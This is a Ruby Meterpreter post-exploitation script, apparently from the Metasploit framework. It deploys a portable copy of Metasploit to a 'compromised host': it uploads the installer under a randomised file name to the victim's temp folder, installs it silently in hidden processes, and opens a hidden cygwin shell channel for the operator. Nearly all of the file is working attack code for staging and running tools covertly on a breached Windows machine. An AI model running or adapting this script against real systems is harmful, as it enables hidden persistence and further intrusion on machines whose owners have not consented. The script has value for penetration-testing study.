#!/usr/bin/env ruby
###############################################################
#                                                             #
#                  Framework Payload Deployer                 #
#                                                             #
###############################################################
# Meterpreter script to deploy the portable version of        #
# Metasploit to a compromised host.                           #
###############################################################
# This meterpreter script was altered from a memdump script   #
# that Carlos Perez created.                                  #
# Orignial Script Created by Carlos Perez                     #
# Heavily Altered by Rob Fuller at mubix[at]room362.com       #
# Verion: sloppy                                              #
###############################################################

###############################################################
# This could be used with any cygwin zip, nmap? netcat?       #
###############################################################

session = client
host,port = session.tunnel_peer.split(':')

# Creat log file and directory for debugging
logs = ::File.join(Msf::Config.config_directory, 'logs', 'deploymsf', host)
::FileUtils.mkdir_p(logs)

@@exec_opts = Rex::Parser::Arguments.new(
		"-h" => [ false, "Help menu."],
		"-d" => [ true, "Set alternate local path MSF Portable installer file (default /tmp/)"],
		"-f" => [ true, "Set alternate name MSF Portable installer file(default framework-3.3-dev.exe)"],
		"-p" => [ true, "Set alternate remote path for deployment (default %TEMP%)"]
		)

tmp = session.fs.file.expand_path("%TEMP%")
msfp_path = "/tmp/"
installer = "framework-3.3-dev.exe"
timeoutsec = 300


def installer_loop(session,tmp,msfpscramble,timeoutsec)
	p = session.sys.process.execute("#{tmp}\\#{msfpscramble}.exe /S /D=#{tmp}\\msfp", nil, {'Hidden' => 'true','Channelized' => 'true'})
	prog2check = msfpscramble + ".exe"
	found = 0
       while found == 0
       	session.sys.process.get_processes().each do |x|
       		found =1
			if prog2check == (x['name'].downcase)
				sleep(0.5)
				print_line(".")
				found = 0
			end
		end
	end
	p.close
	print_status("Done!")
	print_status("Installation Complete!")
end

###############################################################
#    Uploading, Extracting, and channelizing MSFp             #
###############################################################

def deploy_msfp(session,tmp,msfp_path,installer,timeoutsec)
	tmpout = []
	
	msfpscramble = sprintf("%.5d",rand(100000))
	print_status("Uploading MSFp for for deployment....")
	begin
		session.fs.file.upload_file("#{tmp}\\#{msfpscramble}.exe","#{msfp_path}/#{installer}")
		print_status("MSFp uploaded as #{tmp}\\#{msfpscramble}.exe")
	rescue::Exception => e
			print_status("The following Error was encountered: #{e.class} #{e}")
	end
	session.response_timeout=timeoutsec
	print_status("Installing MSFp..")
	begin
		installer_loop(session,tmp,msfpscramble,timeoutsec)
		print_status("Running cygwin shell channelized...")
		session.sys.process.execute("cmd.exe /C move #{tmp}\\#{msfpscramble}.exe #{tmp}\\msfp\\tmp\\#{installer}", nil, {'Hidden' => 'true'})
		p = session.sys.process.execute("#{tmp}\\msfp\\winshell.bat", nil, {'Hidden' => 'true','Channelized' => 'true'})
		print_status("Channel #{p.channel.cid} created - Type: interact #{p.channel.cid} to play")
		print_status("Be warned, it takes a bit for post setup to happen")
		print_status("and you will not see a prompt, try pwd to check")
	rescue::Exception => e
			print_status("The following Error was encountered: #{e.class} #{e}")
	end
end




################## MAIN ##################
# Parsing of Option
hlp = 0
@@exec_opts.parse(args) { |opt, idx, val|
	case opt
		when "-d"
			msfp_path = val
		when "-f"
			installer = val
		when "-t"
			timeoutsec = val
		when "-p"
			tmp = val
		when "-h"
			hlp = 1
			print(
			"MSF Portable Deployment Meterpreter Script\n" +
			@@exec_opts.usage
			)
			break

		end

}
if (hlp == 0)
		print_status("Running Meterpreter MSFp Deploytment Script.....")
		deploy_msfp(session,tmp,msfp_path,installer,timeoutsec)
end
